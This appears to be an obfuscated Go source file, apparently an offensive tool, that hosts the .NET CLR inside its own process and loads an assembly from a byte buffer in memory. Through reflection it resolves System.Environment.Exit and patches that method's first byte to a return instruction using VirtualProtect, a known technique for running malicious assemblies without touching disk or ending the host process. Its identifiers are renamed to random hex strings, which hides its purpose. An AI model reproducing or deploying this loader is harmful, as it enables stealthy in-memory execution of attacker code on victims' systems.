package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func _efd63fbb(_90f70acb string, _1db235d1 []byte) (*_f5ea272a, []uint16, error) {
	var _782af1f3 *_cde9a584

	// Get the Metahost
	_b0b3cddd, _a30f3ccf := _f5b5f41e(_43849882, _92ed0035)
	if _a30f3ccf != nil {
		return nil, nil, _a30f3ccf
	}

	// Get Runtime Info from the Metahost
	_23630b21, _a30f3ccf := _97617b08(_b0b3cddd, _90f70acb)
	if _a30f3ccf != nil {
		return nil, nil, _a30f3ccf
	}

	// Get the ICLRRuntimeHost and store it in MyCustomHost
	_a30f3ccf = _23630b21._d797eaba(_216acd05, _52a3e46d, unsafe.Pointer(&_782af1f3))
	if _a30f3ccf != nil {
		return nil, nil, _a30f3ccf
	}

	var _ef55b14b uintptr
	var _3e97d486 *_85314308
	_b55f5491, _ := windows.BytePtrFromString("GetCLRIdentityManager")
	syscall.SyscallN(_23630b21._89dd8d85._725ed6c3, uintptr(unsafe.Pointer(_23630b21)), uintptr(unsafe.Pointer(_b55f5491)), uintptr(unsafe.Pointer(&_ef55b14b)))

	syscall.SyscallN(_ef55b14b, uintptr(unsafe.Pointer(&_a11927f3)), uintptr(unsafe.Pointer(&_3e97d486)))

	// Load Assembly
	_1b5d0313 := _61d36a31(&_1db235d1[0], uint32(len(_1db235d1)))
	_71edd47f := make([]uint16, 4096)
	_021a164d := uint32(4096)
	syscall.SyscallN(_3e97d486._7b14dd94._0b5e980b, uintptr(unsafe.Pointer(_3e97d486)), uintptr(unsafe.Pointer(_1b5d0313)), uintptr(0), uintptr(unsafe.Pointer(&_71edd47f[0])), uintptr(unsafe.Pointer(&_021a164d)))

	fmt.Println(fmt.Sprintf("[+] GetBindingIdentityFromStream: %s", syscall.UTF16ToString(_71edd47f)))

	// Create a Target Assembly and bind it to our Host
	var _2d4123b5 *_5662f202 = &_5662f202{}
	_983003e2, _ := syscall.UTF16PtrFromString(syscall.UTF16ToString(_71edd47f))
	_2d4123b5._f8673b44 = _983003e2
	_2d4123b5._a52f29f4 = &_1db235d1[0]
	_2d4123b5._a57adb70 = uint32(len(_1db235d1))

	fmt.Println("[?] Printing TargetAssembly otherwise it dies because of Go GC", _2d4123b5)

	// Create Memory Manager
	// memManger := GetMemoryManager()

	// Initialise our custom IHOSTControl
	var _133938e9 _42204c58
	_133938e9 = _60cb63b3()
	_133938e9._54362c53 = _2d4123b5
	//customHostControl.MemoryManager = memManger

	// Check Identity Manager That we will Use Later
	syscall.SyscallN(_782af1f3._89dd8d85._3b4fa241, uintptr(unsafe.Pointer(_782af1f3)), uintptr(unsafe.Pointer(&_133938e9)))
	fmt.Println("[+] Set Custom Host Successfully")

	_782af1f3._3eabf128()
	fmt.Println("[+] Started CLR Succesfully")

	var _d27a3928 *_f5ea272a
	_a30f3ccf = _23630b21._d797eaba(_251588fb, _d40bda53, unsafe.Pointer(&_d27a3928))
	return _d27a3928, _71edd47f, nil
}

func _f763b066(_d27a3928 *_f5ea272a, _cd916822 []uint16) *_6ef9d402 {
	_d2d3ad38, _a30f3ccf := _dcf7a078(_d27a3928)
	if _a30f3ccf != nil {
		return nil
	}

	// Patchin System Exit
	//PatchSysExit(appDomain)

	var _fec9970f *_6ef9d402
	_bc66dc16 := windows.UTF16ToString(_cd916822)
	_fec9970f, _ = _d2d3ad38._c41b379d(_bc66dc16)
	return _fec9970f
}

func _bac3447b(_d2d3ad38 *_f5d69006) {
	_b582db40, _a30f3ccf := _d2d3ad38._c41b379d("mscorlib, Version=4.0.0.0")
	if _a30f3ccf != nil {
		fmt.Println("Error Returning ", _a30f3ccf)
	}

	// Get The Exit Class
	var _5be84b38 *_14a07b44
	_b9bd4de7, _ := _b8bd4b22("System.Environment")
	_a0e7c2cc, _, _0787a2a8 := syscall.SyscallN(_b582db40._89dd8d85._0aee8693, uintptr(unsafe.Pointer(_b582db40)), uintptr(_b9bd4de7), uintptr(unsafe.Pointer(&_5be84b38)))
	fmt.Println(fmt.Sprintf("[+] Done Syscall GetType ---> %X, %s", _a0e7c2cc, _0787a2a8))

	// Get The Exit Method
	var _6b929ff5 *_3bb2fce1
	_a83a5b53, _ := _b8bd4b22("Exit")
	_7a080bb2 := 16 | 8
	_a0e7c2cc, _, _0787a2a8 = syscall.SyscallN(_5be84b38._89dd8d85._6e9d24ce, uintptr(unsafe.Pointer(_5be84b38)), uintptr(_a83a5b53), uintptr(_7a080bb2), uintptr(unsafe.Pointer(&_6b929ff5)))
	fmt.Println(fmt.Sprintf("[+] Done Syscall ExitClass.GetMethod_2 ---> %X, %s", _a0e7c2cc, _0787a2a8))

	// Getting methodInfoClass
	var _32bf6715 *_14a07b44
	_ffcd4799, _ := _b8bd4b22("System.Reflection.MethodInfo")
	_a0e7c2cc, _, _0787a2a8 = syscall.SyscallN(_b582db40._89dd8d85._0aee8693, uintptr(unsafe.Pointer(_b582db40)), uintptr(_ffcd4799), uintptr(unsafe.Pointer(&_32bf6715)))
	fmt.Println(fmt.Sprintf("[+] Done Syscall GetType methodInfoClass ---> %X, %s", _a0e7c2cc, _0787a2a8))

	// Get Property Info
	var _f3dd9d1b *_9e362d0c
	_8de91b77, _ := _b8bd4b22("MethodHandle")
	_9c645c91 := 4 | 16
	_a0e7c2cc, _, _0787a2a8 = syscall.SyscallN(_32bf6715._89dd8d85._c1fb4cf1, uintptr(unsafe.Pointer(_32bf6715)), uintptr(_8de91b77), uintptr(_9c645c91), uintptr(unsafe.Pointer(&_f3dd9d1b)))
	fmt.Println(fmt.Sprintf("[+] Done Syscall GetProperty ---> %X, %s", _a0e7c2cc, _0787a2a8))

	// Some Stuff With Variant
	var _9239c6b6 _60f45b99
	_9239c6b6._6fec2b20 = 13
	_9239c6b6._b52f9f3f = uintptr(unsafe.Pointer(_6b929ff5))

	_3f4fe970, _a30f3ccf := _c7def8d3(0, 0, nil)
	if _a30f3ccf != nil {
		fmt.Println("Suspicious correct")
	}
	_073518b0 := _60f45b99{}
	_a0e7c2cc, _, _0787a2a8 = syscall.SyscallN(_f3dd9d1b._10ffb06d._f707d896, uintptr(unsafe.Pointer(_f3dd9d1b)), uintptr(unsafe.Pointer(&_9239c6b6)), uintptr(unsafe.Pointer(_3f4fe970)), uintptr(unsafe.Pointer(&_073518b0)))
	fmt.Println(fmt.Sprintf("[+] Done Syscall GetValue ---> %X, %s", _a0e7c2cc, _0787a2a8))

	// Get GetFunctionPointer function
	var _ee55c260 *_14a07b44
	_824de86f, _ := _b8bd4b22("System.RuntimeMethodHandle")
	_a0e7c2cc, _, _0787a2a8 = syscall.SyscallN(_b582db40._89dd8d85._0aee8693, uintptr(unsafe.Pointer(_b582db40)), uintptr(_824de86f), uintptr(unsafe.Pointer(&_ee55c260)))
	fmt.Println(fmt.Sprintf("[+] Done Syscall GetType ---> %X, %s", _a0e7c2cc, _0787a2a8))

	var _e3751096 *_3bb2fce1
	_a83a5b53, _ = _b8bd4b22("GetFunctionPointer")
	_bb1177ac := 4 | 16
	_a0e7c2cc, _, _0787a2a8 = syscall.SyscallN(_ee55c260._89dd8d85._6e9d24ce, uintptr(unsafe.Pointer(_ee55c260)), uintptr(_a83a5b53), uintptr(_bb1177ac), uintptr(unsafe.Pointer(&_e3751096)))
	fmt.Println(fmt.Sprintf("[+] Done Syscall ExitClass.GetMethod_2 ---> %X, %s", _a0e7c2cc, _0787a2a8))

	_a3bd8ddd, _a30f3ccf := _c7def8d3(0, 0, nil)
	if _a30f3ccf != nil {
		fmt.Println("Suspicious correct")
	}
	_aac3e6d4 := _60f45b99{}
	_a0e7c2cc, _, _0787a2a8 = syscall.SyscallN(_e3751096._89dd8d85._33f78d2f, uintptr(unsafe.Pointer(_e3751096)), uintptr(unsafe.Pointer(&_073518b0)), uintptr(unsafe.Pointer(_a3bd8ddd)), uintptr(unsafe.Pointer(&_aac3e6d4)))
	fmt.Println(fmt.Sprintf("[+] Done Syscall GetValue ---> %X, %s", _a0e7c2cc, _0787a2a8))

	_14b04338 := _aac3e6d4._b52f9f3f
	fmt.Println(_aac3e6d4)
	fmt.Println(fmt.Sprintf("Address is %X", _aac3e6d4._b52f9f3f))
	var _71bdef13 uint32
	_a30f3ccf = windows.VirtualProtect(_14b04338, 1, windows.PAGE_READWRITE, &_71bdef13)
	if _a30f3ccf != nil {
		fmt.Println("Error In VirtualProtect")
		fmt.Println(_a30f3ccf.Error())
	}

	_963d68e6 := []byte{0xC3}
	_9d1d58a0(unsafe.Pointer(_14b04338), unsafe.Pointer(&_963d68e6[0]), 1)

	var _400b23e2 uint32
	_a30f3ccf = windows.VirtualProtect(_14b04338, 1, _71bdef13, &_400b23e2)
	if _a30f3ccf != nil {
		fmt.Println("Error In VirtualProtect")
		fmt.Println(_a30f3ccf.Error())
	}

}
